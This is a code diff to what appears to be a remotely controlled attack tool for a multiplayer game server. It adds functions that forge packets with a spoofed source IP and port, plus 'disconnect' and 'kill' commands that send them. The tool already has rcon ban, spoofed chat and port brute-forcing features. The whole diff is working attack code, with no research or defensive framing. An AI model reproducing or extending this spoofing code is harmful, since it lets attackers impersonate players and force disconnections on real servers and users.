@@ -415,6 +415,46 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 	m_SendRcon = true;
 }
 
+void SendDisconnect(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
+{
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromPort = htons(SpoofPort);
+
+	m_ToIP = inet_addr(SrvIP);
+	m_ToPort = htons(Port);
+
+	unsigned char buffer[2048];
+	int BufferSize = 0;
+	Reset(0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackDisconnect(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+}
+
+void SendKill(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
+{
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromPort = htons(SpoofPort);
+
+	m_ToIP = inet_addr(SrvIP);
+	m_ToPort = htons(Port);
+
+	unsigned char buffer[2048];
+	int BufferSize = 0;
+	Reset(0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackKill(&buffer[0], 0);
+	SendData((const char*)buffer, BufferSize, 0);
+}
+
 void SendChat(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, const char *Msg)
 {
 	// ToDo: More than one word as Msg ._. --Note by Meskalin: This should not be done here, but where the command is received.
@@ -691,6 +731,34 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: chat <srvip> <srvport> <spoofip> <spoofport> <message>", strlen("[Server]: Please use: chat <srvip> <srvport> <spoofip> <spoofport> <message>"), 0);
+			}
+			else if(strcmp(aCmd[0], "disconnect") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
+				{
+					int SrvPort = atoi(aCmd[2]);
+					int Port = atoi(aCmd[4]);
+
+					SendDisconnect(aCmd[1], SrvPort, aCmd[3], Port);
+
+					send(g_Client, "[Server]: Spoofed disconnect sent successfully!", strlen("[Server]: Spoofed disconnect sent successfully!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: disconnect <srvip> <srvport> <spoofip> <spoofport>", strlen("[Server]: Please use: disconnect <srvip> <srvport> <spoofip> <spoofport>"), 0);
+			}
+			else if(strcmp(aCmd[0], "kill") == 0)
+			{
+				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0])
+				{
+					int SrvPort = atoi(aCmd[2]);
+					int Port = atoi(aCmd[4]);
+
+					SendKill(aCmd[1], SrvPort, aCmd[3], Port);
+
+					send(g_Client, "[Server]: Spoofed kill sent successfully!", strlen("[Server]: Spoofed kill sent successfully!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: kill <srvip> <srvport> <spoofip> <spoofport>", strlen("[Server]: Please use: kill <srvip> <srvport> <spoofip> <spoofport>"), 0);
 			}
 			else if(strcmp(aCmd[0], "bruteport") == 0)
 			{
